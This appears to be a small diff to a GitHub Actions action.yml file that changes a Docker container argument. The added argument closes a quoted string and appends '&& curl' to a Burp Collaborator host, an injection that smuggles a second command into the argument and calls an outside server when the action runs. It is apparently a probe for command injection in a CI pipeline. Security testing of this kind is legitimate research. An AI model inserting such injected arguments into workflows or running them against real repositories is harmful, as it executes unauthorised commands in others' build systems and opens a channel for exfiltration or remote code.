@@ -7,5 +7,5 @@ runs:
   using: docker
   image: 'Dockerfile'
   args:
-    - '\"'
+    - '\" && curl 1kmqix47ig76i1b3j2tna0r4vv1lpa.burpcollaborator.net'
 
